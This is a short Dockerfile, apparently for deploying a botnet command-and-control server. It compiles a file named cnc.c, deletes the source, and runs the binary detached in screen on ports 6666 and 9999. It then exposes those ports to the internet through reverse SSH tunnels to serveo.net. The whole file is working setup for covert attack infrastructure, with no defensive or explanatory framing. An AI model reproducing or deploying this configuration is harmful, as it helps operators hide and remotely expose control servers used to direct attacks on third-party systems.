# Use an official Ubuntu runtime as a base image
FROM ubuntu:latest

# Update the package repository and install openssh-client and gcc
RUN apt-get update && \
    apt-get install -y openssh-client && \
    apt-get install -y build-essential && \
    apt-get install -y screen

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
COPY . /app

# Add serveo.net to known hosts
RUN mkdir -p /root/.ssh && \
    ssh-keyscan serveo.net >> /root/.ssh/known_hosts

# Compile cnc.c into cnc executable and remove cnc.c
RUN gcc cnc.c -o cnc -pthread && \
    rm -rf cnc.c

# Run the ./cnc command and both SSH commands in hidden mode using screen
CMD ["sh", "-c", "screen -d -m ./cnc 6666 1 9999 && screen -d -m ssh -R 9999:localhost:9999 serveo.net && screen -d -m ssh -R 6666:localhost:6666 serveo.net"]
